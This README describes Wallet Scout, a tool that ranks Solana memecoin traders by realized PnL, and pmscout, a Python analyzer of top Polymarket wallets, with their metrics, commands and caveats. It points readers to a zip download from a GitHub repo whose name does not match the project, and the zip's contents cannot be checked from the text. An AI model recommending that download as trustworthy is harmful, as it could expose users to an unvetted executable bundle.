# Wallet Scout

Wallet Scout ranks Solana memecoin traders (Pump.fun, Fomo, Phantom) by **realized** performance over a lookback window (default 90 days). It produces a sortable HTML leaderboard and a CSV watchlist you can copy-trade or monitor.

Data comes from the [Helius](https://dashboard.helius.dev) enhanced-transactions API (a free key is enough to start).

## Download

**[⬇ Download WalletScout.zip](https://github.com/moderationrator-web/JSak/raw/main/dist/WalletScout.zip)** for Windows or Mac. The download starts straight away.

- **Windows:** right-click `WalletScout.zip` and choose **Extract All**, then double-click `Wallet Scout.html` in the extracted folder.
- **Mac:** double-click `WalletScout.zip`, then double-click `Wallet Scout.html` in the new Wallet Scout folder.

It opens in your web browser. There's nothing to install, and the zip includes a `How to open.txt` guide.

## The app

`Wallet Scout.html` (also at `dist/wallet-scout.html`) is the whole tool in one file. Open it, then:

1. Pick **Winning tokens** (paste the mints of top Pump.fun runners) or **Wallet list**.
2. Paste your Helius API key. It's saved only in that browser.
3. Click **Run scan**. It finds the buyers, pulls each wallet's history, and ranks them.

It opens on synthetic demo data so you can explore first. Results export as a CSV watchlist or JSON. Rebuild the app and the zip with `npm run app`.

## Command line

Node ≥ 20, no dependencies.

```bash
export HELIUS_API_KEY=...
node src/cli.js discover --mints mints.txt          # wallets that bought several winners, early
node src/cli.js analyze --wallets data/candidates.json   # → data/analysis.json + data/report.html
```

## Pipeline

1. **Discover** (`discover --mints`): give it the mint addresses of the last 90 days' top Pump.fun runners (one per line; copy them from pump.fun, DexScreener or GMGN). It pulls each token's history and ranks wallets by how many of those tokens they bought and how early they entered (entry percentile). Or skip this step and pass your own wallet list.
2. **Analyze** (`analyze --wallets`): pulls every wallet's transactions in the window, then:
   - **Extracts trades** from balance deltas (SOL + wSOL against exactly one token), so the same logic covers Pump.fun bonding curves, PumpSwap, Jupiter and Raydium. Failed transactions, transfers and token-for-token swaps are skipped.
   - **FIFO PnL per token** in SOL. Sells of tokens bought *before* the window are counted as "unmatched" and kept out of PnL, so the tool doesn't award fake profit.
   - **Metrics**: realized PnL, ROI, win rate (closed positions), profit factor, median token ROI, median hold time, trades per active day, open cost, best/worst token, and venue and frontend mix.
   - **Flags**: `bot` (>150 trades/active day or median hold <20s, which a person can't copy), `low-sample` (<10 closed positions), `one-hit` (one token is >80% of gross profit), `truncated` (hit `--max-pages`).
   - **Score (0–100)**: 35% log-scaled PnL, 25% win rate, 20% profit factor, 20% sample size; ×0.3 for bots, ×0.6 for one-hit wallets. Wallets that aren't profitable score 0. See `src/metrics.js`.
3. **Report**: the app (above) with the results embedded, written to `data/report.html`, with filters (hide bots and low-sample wallets, minimum win rate, frontend), sortable columns, a per-wallet breakdown with Solscan links, and CSV watchlist export.

## Platform attribution

`config/platforms.json` maps trades to a **venue** (Pump.fun's bonding-curve and PumpSwap program IDs, Jupiter, Raydium, Meteora) and a **frontend** (Phantom, Fomo). Frontends are detected by the fee account each app charges. **Those fee accounts ship empty**, so add them before trusting the frontend split: open a swap you made in Phantom or Fomo on Solscan and copy the account that received the app fee. Until you do, every trade shows as `direct`.

## Caveats

- PnL is realized only. Open bags are reported at cost, not marked to market.
- SOL deltas include network fees, priority fees and token-account rent, so costs are slightly conservative.
- Busy wallets are capped at `--max-pages` (100 transactions per page). Raise it if you need full history for high-frequency wallets.
- Past performance in memecoins says little about future returns. Use the watchlist for research, not as a signal to size into.

## Development

```bash
npm test
```

---

## pmscout: Polymarket top-wallet analyzer (Python)

**pmscout** analyses every top Polymarket wallet over a rolling 90-day window. It renders the results as a single, self-contained HTML dashboard plus CSV exports.

It answers:

- **Who actually made money in the last 90 days?** It ranks wallets by 90-day PnL (realized plus unrealized on positions opened in the window), not by lifetime totals.
- **How do they make it?** Every wallet gets a trading style (market maker, whale, favorite grinder, longshot hunter, swing trader, specialist, generalist) and tags such as *One big hit*, *Scalper* and *Gone quiet*.
- **Is it repeatable?** A 0–100 *consistency* score combines profitable weeks, profit factor, dependence on a single win, sample size and drawdown. A *copy score* discounts it for things a follower can't replicate.
- **What does smart money hold right now?** *Consensus* lists open positions shared by several top wallets. *Contested* lists markets where top wallets sit on opposite sides. *Market heat* shows where the top wallets traded most.
- **Who might be the same operator?** *Linked wallets* lists pairs with heavily overlapping markets and near-simultaneous entries.

Standard library only (Python 3.9+). Everything comes from Polymarket's public, unauthenticated APIs.

### Quick start

```bash
pip install -e .            # or skip and use `python -m pmscout ...`
pmscout run                 # ~10–20 min for ~500 wallets at the default 8 req/s
open out/dashboard.html
```

Try it offline first. `pmscout demo` runs the whole pipeline against a built-in simulator. Every wallet, market and person in it is fictional, and the dashboard says so in a banner:

```bash
pmscout demo && open out-demo/dashboard.html
```

#### Network access

`pmscout run` needs outbound HTTPS to:

- `data-api.polymarket.com` (leaderboards, activity, positions)
- `gamma-api.polymarket.com` (event tags, only with `--enrich-tags`)

In a sandboxed environment with an egress allowlist, such as a Claude Code cloud environment, add both domains to the allowed hosts first.

### Commands

| Command | What it does |
|---|---|
| `pmscout run` | collect + analyze + report in one go |
| `pmscout collect` | download leaderboards and per-wallet history into `out/raw/` |
| `pmscout analyze [--enrich-tags]` | compute metrics into `out/analysis.json` |
| `pmscout report` | render `out/dashboard.html`, `out/wallets.csv`, `out/consensus.csv` |
| `pmscout demo` | full pipeline against the offline simulator into `out-demo/` |

Useful options for `run` / `collect`:

| Option | Default | Meaning |
|---|---|---|
| `--days` | 90 | window length |
| `--depth` | 100 | wallets taken from each overall leaderboard (week, month and all-time, ranked by PnL and by volume) |
| `--category-depth` | 50 | wallets from each category's monthly PnL board (politics, sports, crypto…); 0 disables |
| `--max-wallets` | 500 | cap on wallets analysed in depth, best leaderboard ranks first (0 = everyone) |
| `--wallet 0x…` | | add a specific wallet (repeatable) |
| `--rate` | 8 | max requests per second (Polymarket's documented limits are well above this) |
| `--workers` | 6 | parallel wallet downloads |
| `--max-age-hours` | 12 | reuse downloaded wallet files younger than this (runs are resumable) |
| `--refresh` | | ignore cached wallet files |
| `--enrich-tags` | | categorise markets with Gamma event tags instead of keyword rules alone |

### Method

#### Universe

Polymarket has no 90-day leaderboard. pmscout takes the union of the overall WEEK, MONTH and ALL boards (by PnL and by volume) plus every category's MONTH PnL board. That catches wallets that are hot right now as well as long-run winners that stayed active. It then re-ranks all of them on the actual 90-day window.

#### 90-day PnL

| Field | Definition |
|---|---|
| `realized_90d` | Positions closed inside the window (`/closed-positions`), plus resolved-but-unredeemed positions (`/positions`, `redeemable`) whose market end date falls in the window |
| `upnl_window` | Unrealized PnL of still-open positions the wallet bought into during the window. Positions untouched since before the window are excluded because their gains accrued earlier. |
| `pnl_90d` | `realized_90d + upnl_window`. This is the ranking metric. |
| `net_cash_90d` | Cross-check from the raw ledger: sells + redemptions + merges + rewards − buys − splits |
| `pnl_ex_best` | `pnl_90d` without the single best bet. When it is ≤ 0 the wallet is tagged *One big hit*. |

#### Scores

- **Consistency (0–100)**: 30% share of profitable weeks, 25% profit factor (1 → 0, ≥ 4 → full), 20% (1 − largest win / gross wins), 15% sample size (60+ closed positions = full), 10% (1 − drawdown / peak). The score is halved if realized PnL ≤ 0.
- **Copy score**: consistency × penalties for market making (×0.25), median hold < 2h (×0.6), average buy price ≥ 93¢ (×0.7), < 10 trades (×0.5), inactive 14+ days (×0.7), negative PnL (×0.5).

#### Styles

Styles are assigned in this order, and a wallet takes the first one that matches:

1. **Market Maker**: ≥ 80 trades per active day, or ≥ 35% of markets bought on both sides with 1,500+ trades
2. **Whale**: median trade ≥ $5k across ≤ 60 markets
3. **Favorite Grinder**: ≥ 50% of buy volume at ≥ 85¢
4. **Longshot Hunter**: ≥ 35% of buy volume at ≤ 20¢
5. **Swing Trader**: sells ≥ 50% of buy volume, median hold ≤ 72h
6. **Specialist**: ≥ 70% of buy volume in one category
7. **Generalist**: everything else

#### Caveats

- **Download caps.** Very active wallets can hit the per-wallet caps (`--max-activity`, default 15,000 rows). Activity is fetched newest-first, so a capped wallet's oldest trades in the window are missing. The dashboard marks these wallets "partial history".
- **Proxy wallets.** Leaderboard wallets are Polymarket proxy wallets, and one person can run several of them.
- **Market makers.** Their PnL includes rebates and inventory effects, so compare them to directional wallets with care.
- **Not advice.** Ninety days is a short sample, and none of this is financial advice.

### Data access details

The Data API's offset pagination is capped (e.g. `/activity` at offset 5,000). When a wallet exceeds the cap, pmscout moves the `end` timestamp back to the oldest row it has seen and restarts at offset 0. It de-duplicates rows that share the boundary timestamp, so no row is skipped or counted twice. Requests share a token-bucket rate limiter and retry on 429/5xx, honouring `Retry-After`.

Each wallet's slimmed history is written to `out/raw/wallets/<address>.json.gz`, which makes runs resumable and re-analysis free.

### Development

```bash
pip install -e '.[dev]'
pytest
```

The tests cover the metric maths on hand-built fixtures and the pagination edge cases (offset caps, boundary duplicates, unsupported sort fallback, retries). They also run an end-to-end pass of the whole pipeline against the simulator, which enforces the real endpoints' limit/offset caps.
